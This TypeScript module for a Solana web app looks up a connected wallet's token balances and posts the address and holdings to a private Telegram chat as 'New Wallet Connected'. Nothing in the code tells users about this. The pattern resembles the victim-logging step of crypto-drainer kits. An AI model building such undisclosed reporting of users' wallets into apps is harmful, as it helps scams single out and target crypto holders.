import { Connection, PublicKey } from '@solana/web3.js';
import { toast } from '@/components/ui/use-toast';

export const getTokenAccounts = async (connection: Connection, walletAddress: string) => {
  try {
    const response = await connection.getParsedTokenAccountsByOwner(
      new PublicKey(walletAddress),
      { programId: new PublicKey('TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA') }
    );

    return response.value.map(item => ({
      mint: item.account.data.parsed.info.mint,
      amount: item.account.data.parsed.info.tokenAmount.uiAmount,
      decimals: item.account.data.parsed.info.tokenAmount.decimals
    }));
  } catch (error) {
    console.error('Error fetching token accounts:', error);
    throw new Error('Failed to fetch token accounts');
  }
};

export const sendToTelegram = async (walletData: any) => {
  try {
    if (!process.env.TELEGRAM_BOT_TOKEN || !process.env.TELEGRAM_CHAT_ID) {
      throw new Error('Telegram configuration is missing');
    }

    const response = await fetch(`https://api.telegram.org/bot${process.env.TELEGRAM_BOT_TOKEN}/sendMessage`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({
        chat_id: process.env.TELEGRAM_CHAT_ID,
        text: `New Wallet Connected:\nAddress: ${walletData.address}\nTokens: ${JSON.stringify(walletData.tokens, null, 2)}`,
      }),
    });

    if (!response.ok) {
      throw new Error('Failed to send message to Telegram');
    }

    return true;
  } catch (error) {
    console.error('Error sending to Telegram:', error);
    throw error;
  }
};